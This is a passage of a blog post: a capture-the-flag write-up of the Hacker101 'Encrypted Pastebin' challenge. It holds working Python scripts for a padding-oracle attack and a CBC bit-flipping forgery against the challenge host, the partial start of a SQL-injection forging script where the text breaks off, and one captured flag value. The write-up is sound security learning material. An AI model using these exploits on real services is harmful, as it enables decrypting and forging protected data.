<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before allTo my surprise, this is a three years lasting journey on solving this challenge … This is an interesting challenge combined several simple technique and is well worth solving! Write UpThis i">
<meta property="og:type" content="article">
<meta property="og:title" content="Encrypted Pastebin on Hacker101CTF">
<meta property="og:url" content="http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before allTo my surprise, this is a three years lasting journey on solving this challenge … This is an interesting challenge combined several simple technique and is well worth solving! Write UpThis i">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/BkrUb3BqR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJ3QW0Eq0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkqIZAV5A.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ByfoW045A.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Byf5bAVcC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1tNw2H9C.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1FGOnr5A.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Ska4j3B9C.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S138jYB5C.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryvKVorc0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rykzKsHcC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJlqcsBcC.png">
<meta property="article:published_time" content="2024-08-11T04:36:17.000Z">
<meta property="article:modified_time" content="2024-08-11T04:40:05.002Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Cryptography">
<meta property="article:tag" content="AES">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/BkrUb3BqR.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Encrypted Pastebin on Hacker101CTF</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/08/11/hacker101ctf-bugdb/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/08/08/latex-vuln/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&text=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&title=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&is_video=false&description=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Encrypted Pastebin on Hacker101CTF&body=Check out this article: http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&title=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&title=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&title=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&title=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&name=Encrypted Pastebin on Hacker101CTF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/08/11/hacker101ctf-enc-pastebin/&t=Encrypted Pastebin on Hacker101CTF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">3.</span> <span class="toc-text">RECON</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Padding-Oracle"><span class="toc-number">4.</span> <span class="toc-text">Padding Oracle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bit-flipping"><span class="toc-number">5.</span> <span class="toc-text">Bit flipping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">6.</span> <span class="toc-text">SQL Injection</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Encrypted Pastebin on Hacker101CTF
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-08-11T04:36:17.000Z" class="dt-published" itemprop="datePublished">2024-08-11</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/AES/" rel="tag">AES</a>, <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Cryptography/" rel="tag">Cryptography</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>To my surprise, this is a three years lasting journey on solving this challenge …<br><img src="https://hackmd.io/_uploads/BkrUb3BqR.png" alt="image"></p>
<p>This is an interesting challenge combined several simple technique and is well worth solving!</p>
<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><p>This is a web application which has a posting function just like Pastebin, after you sent a post, it would generate a unique key for that post, you can see the post only if you have the right key in the url.  </p>
<p>Also, base on the paragraph in the home page, the key is probably generated with AES-128 CBC Mode.  </p>
<p><img src="https://hackmd.io/_uploads/BJ3QW0Eq0.png" alt="image">  </p>
<h2 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h2><p>A url example is down below.<br><code>https://669099f2c694bc3cf1c1f5ae19016f77.ctf.hacker101.com/?post=KWJlR2cCCcGYhMBdPSotLiWdHcoNMiYSSTNoRL9zfRTLGTFdFdu9xBxiXc9SJFQ5NEGkB90mbkF-zvdqnoT4X2fQykzaXWCMY7CX3IwyYXRnAAICk4d98bTrUHXRVENpfQ5sANV9fGIDT-eWO4EUD4H2nSL5egynC6TAfEXoRzs92SQLeu7V1JLc06I5-WraCOH38VOdkr-jmQYRZ!cgTQ~~</code><br>First of all, I tried to change the key value and observe the response.  </p>
<p>But after I simply added an ‘a’ to the front of the ‘post’ param, I got a response like this…  </p>
<p><img src="https://hackmd.io/_uploads/rkqIZAV5A.png" alt="image"></p>
<p>First flag gotten!  </p>
<p>How if I change the key into a single character ‘a’?  </p>
<p><code>https://a49c182743e0b433bba6232c5961b860.ctf.hacker101.com/?post=a</code>  </p>
<p><img src="https://hackmd.io/_uploads/ByfoW045A.png" alt="image">  </p>
<p>It shows that it is base64 encode but with some naughty changes on it.  </p>
<p>Also, if I add some padding in the ‘post’ parameter, it would raise a PaddingException…  </p>
<p><img src="https://hackmd.io/_uploads/Byf5bAVcC.png" alt="image"></p>
<p>Maybe is time for a Padding Oracle Attack!  </p>
<h2 id="Padding-Oracle"><a href="#Padding-Oracle" class="headerlink" title="Padding Oracle"></a>Padding Oracle</h2><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia(link)</a>  </p>
<p>I put some threading magic on it to make it faster!<br><strong>padding_oracle.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;https://669099f2c694bc3cf1c1f5ae19016f77.ctf.hacker101.com/?post=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_decode</span>(<span class="params">x</span>):</span><br><span class="line">    x=x.replace(<span class="string">b&#x27;~&#x27;</span>, <span class="string">b&#x27;=&#x27;</span>).replace(<span class="string">b&#x27;!&#x27;</span>, <span class="string">b&#x27;/&#x27;</span>).replace(<span class="string">b&#x27;-&#x27;</span>, <span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> b64decode(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_encode</span>(<span class="params">x</span>):</span><br><span class="line">    x=b64encode(x)</span><br><span class="line">    <span class="keyword">return</span> x.replace(<span class="string">b&#x27;=&#x27;</span>, <span class="string">b&#x27;~&#x27;</span>).replace(<span class="string">b&#x27;/&#x27;</span>, <span class="string">b&#x27;!&#x27;</span>).replace(<span class="string">b&#x27;+&#x27;</span>, <span class="string">b&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">x</span>):</span><br><span class="line">    web=req.get(url+custom_encode(x).decode())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;File &quot;./common.py&quot;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span>  web.text</span><br><span class="line"></span><br><span class="line">cur_param=<span class="string">b&#x27;KWJlR2cCCcGYhMBdPSotLiWdHcoNMiYSSTNoRL9zfRTLGTFdFdu9xBxiXc9SJFQ5NEGkB90mbkF-zvdqnoT4X2fQykzaXWCMY7CX3IwyYXRnAAICk4d98bTrUHXRVENpfQ5sANV9fGIDT-eWO4EUD4H2nSL5egynC6TAfEXoRzs92SQLeu7V1JLc06I5-WraCOH38VOdkr-jmQYRZ!cgTQ~~&#x27;</span></span><br><span class="line"></span><br><span class="line">cur_param=custom_decode(cur_param)</span><br><span class="line"></span><br><span class="line">ans=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">cur=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_byte_range</span>(<span class="params">iv, mess, cur, now, start, end, result</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="keyword">if</span> oracle(iv[:now] + <span class="built_in">bytes</span>([k]) + xor(cur, iv[now+<span class="number">1</span>:], <span class="built_in">chr</span>(<span class="number">16</span>-now).encode()*(<span class="number">15</span>-now)) + mess):</span><br><span class="line">            result.append(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">0</span>, <span class="built_in">len</span>(cur_param)-<span class="number">16</span>, <span class="number">16</span>):</span><br><span class="line">    iv, mess = cur_param[i:i+<span class="number">16</span>], cur_param[i+<span class="number">16</span>:i+<span class="number">32</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> trange(<span class="number">16</span>):</span><br><span class="line">        now = <span class="number">15</span> - j</span><br><span class="line">        threads = []</span><br><span class="line">        result = []</span><br><span class="line">        step = <span class="number">256</span> // <span class="number">32</span></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            start = t * step</span><br><span class="line">            end = (t + <span class="number">1</span>) * step <span class="keyword">if</span> t != <span class="number">31</span> <span class="keyword">else</span> <span class="number">256</span></span><br><span class="line">            thread = threading.Thread(target=find_byte_range, args=(iv, mess, cur, now, start, end, result))</span><br><span class="line">            threads.append(thread)</span><br><span class="line">            thread.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">            thread.join()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            k = result[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> now == <span class="number">15</span>:</span><br><span class="line">                <span class="keyword">if</span> k != iv[<span class="number">15</span>]:</span><br><span class="line">                    cur = xor(k, iv[<span class="number">15</span>], <span class="number">1</span>) + cur</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur = xor(k, iv[now], (<span class="number">16</span>-now)) + cur</span><br><span class="line"><span class="comment">#            print(cur)</span></span><br><span class="line"></span><br><span class="line">    ans += cur</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    cur = <span class="string">b&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>After I extracted the data, I got my second flag and known that is a json format data!<br><code>&#123;&quot;flag&quot;: &quot;^FLAG^5dc0bd44bc917ef1ab7e76de1be3f8d213c7d324acd52409b92ab8ce1764623e$FLAG$&quot;, &quot;id&quot;: &quot;2&quot;, &quot;key&quot;: &quot;FJRyMS3Ib4aor0M9RPTfcQ~~&quot;&#125;</code>  </p>
<p><img src="https://hackmd.io/_uploads/B1tNw2H9C.png" alt="image">  </p>
<p>Well, speaking honestly, I had a wrong idea that the CBC key is just the extracted key in the json data, but after I tried to decrypt the message directly through the IV value and that suspecious key, I known that I’m wrong QwQ…  </p>
<h2 id="Bit-flipping"><a href="#Bit-flipping" class="headerlink" title="Bit flipping"></a>Bit flipping</h2><p>I tried to modify the data into <code>&#123;&quot;id&quot;:&quot;1&quot;&#125;</code>, and this can be done through a simple bit flipping attack.<br>Take a quick review on CBC MODE process:<br><img src="https://hackmd.io/_uploads/S1FGOnr5A.png" alt="image"><br>It’s trivial that I can get the raw decrypted value for the first block (or any other block) of the oringinal ciphertext through an XOR operation with the IV value and the first block of the ciphertext.  </p>
<p>So the flipping payload should be:<br><code>xor(initial_IV, b&#39;&#123;&quot;flag&quot;: &quot;^FLAG^&#39;, b&#39;&#123;&quot;id&quot;:&quot;1&quot;&#125;&#39;)+the_first_block_of_the_ciphertext</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_decode</span>(<span class="params">x</span>):</span><br><span class="line">    x=x.replace(<span class="string">b&#x27;~&#x27;</span>, <span class="string">b&#x27;=&#x27;</span>).replace(<span class="string">b&#x27;!&#x27;</span>, <span class="string">b&#x27;/&#x27;</span>).replace(<span class="string">b&#x27;-&#x27;</span>, <span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> b64decode(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_encode</span>(<span class="params">x</span>):</span><br><span class="line">    x=b64encode(x)</span><br><span class="line">    <span class="keyword">return</span> x.replace(<span class="string">b&#x27;=&#x27;</span>, <span class="string">b&#x27;~&#x27;</span>).replace(<span class="string">b&#x27;/&#x27;</span>, <span class="string">b&#x27;!&#x27;</span>).replace(<span class="string">b&#x27;+&#x27;</span>, <span class="string">b&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x + <span class="built_in">bytes</span>([<span class="number">16</span> - <span class="built_in">len</span>(x) % <span class="number">16</span>] * (<span class="number">16</span> - <span class="built_in">len</span>(x) % <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cur_param=<span class="string">b&#x27;KWJlR2cCCcGYhMBdPSotLiWdHcoNMiYSSTNoRL9zfRTLGTFdFdu9xBxiXc9SJFQ5NEGkB90mbkF-zvdqnoT4X2fQykzaXWCMY7CX3IwyYXRnAAICk4d98bTrUHXRVENpfQ5sANV9fGIDT-eWO4EUD4H2nSL5egynC6TAfEXoRzs92SQLeu7V1JLc06I5-WraCOH38VOdkr-jmQYRZ!cgTQ~~&#x27;</span></span><br><span class="line"></span><br><span class="line">cur_param=custom_decode(cur_param)</span><br><span class="line"></span><br><span class="line">payload=xor(cur_param[:<span class="number">16</span>], <span class="string">b&#x27;&#123;&quot;flag&quot;: &quot;^FLAG^&#x27;</span>, pad(<span class="string">b&#x27;&#123;&quot;id&quot;:&quot;1&quot;&#125;&#x27;</span>))+cur_param[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(custom_encode(payload))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Flag 3:<br><img src="https://hackmd.io/_uploads/Ska4j3B9C.png" alt="image"></p>
<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>How can I do if I want to generate a payload with a length larger than 16?  </p>
<p><em>A quick reminder:</em><br>Before moving forward to this,  how to get the raw decrypted value for a block of any ciphertext?<br><strong>Padding Oracle Again</strong><br>Since it’s feasible to decrypt any block, downbelow is my solving process:<br><code>take the last block of ciphertext as a value which I already known it&#39;s  raw decrypted value.</code><br><code>-&gt;</code><br><code>The further block should be the xored value of the raw content I want to put with that block of ciphertext</code><br><code>-&gt;</code><br><code>decrypt the value of the further block</code><br>And after repeating these steps, I can modify any messages I want to put and try some SQL Injection!  </p>
<p><strong>solve.py</strong><br>The wanted variable is the SQL Injection(Union base) payload in json format.  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_decode</span>(<span class="params">x</span>):</span><br><span class="line">    x=x.replace(<span class="string">b&#x27;~&#x27;</span>, <span class="string">b&#x27;=&#x27;</span>).replace(<span class="string">b&#x27;!&#x27;</span>, <span class="string">b&#x27;/&#x27;</span>).replace(<span class="string">b&#x27;-&#x27;</span>, <span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> b64decode(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_encode</span>(<span class="params">x</span>):</span><br><span class="line">    x=b64encode(x)</span><br><span class="line">    <span class="keyword">return</span> x.replace(<span class="string">b&#x27;=&#x27;</span>, <span class="string">b&#x27;~&#x27;</span>).replace(<span class="string">b&#x27;/&#x27;</span>, <span class="string">b&#x27;!&#x27;</span>).replace(<span class="string">b&#x27;+&#x27;</span>, <span class="string">b&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x + <span class="built_in">bytes</span>([<span class="number">16</span> - <span class="built_in">len</span>(x) % <span class="number">16</span>] * (<span class="number">16</span> - <span class="built_in">len</span>(x) % <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">x</span>):</span><br><span class="line">    web=req.get(url+custom_encode(x).decode())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Incorrect padding&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> web.text <span class="keyword">and</span> <span class="string">&#x27;PaddingException&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> web.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_byte_range</span>(<span class="params">x, suf, i, start, end, result</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        cur_suf = <span class="string">b&#x27;\x01&#x27;</span> * (<span class="number">16</span> - i) + <span class="built_in">bytes</span>([j]) + xor(suf, <span class="built_in">bytes</span>([i^(i-<span class="number">1</span>)] * (i - <span class="number">1</span>)))</span><br><span class="line">        <span class="keyword">if</span> oracle(cur_suf + x):</span><br><span class="line">            result.append(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_init</span>(<span class="params">x</span>):</span><br><span class="line">    cur = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    suf = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">        threads = []</span><br><span class="line">        result = []</span><br><span class="line"></span><br><span class="line">        step = <span class="number">256</span> // <span class="number">64</span></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            start = t * step</span><br><span class="line">            end = (t + <span class="number">1</span>) * step <span class="keyword">if</span> t != <span class="number">63</span> <span class="keyword">else</span> <span class="number">256</span></span><br><span class="line">            thread = threading.Thread(target=find_byte_range, args=(x, suf, i, start, end, result))</span><br><span class="line">            threads.append(thread)</span><br><span class="line">            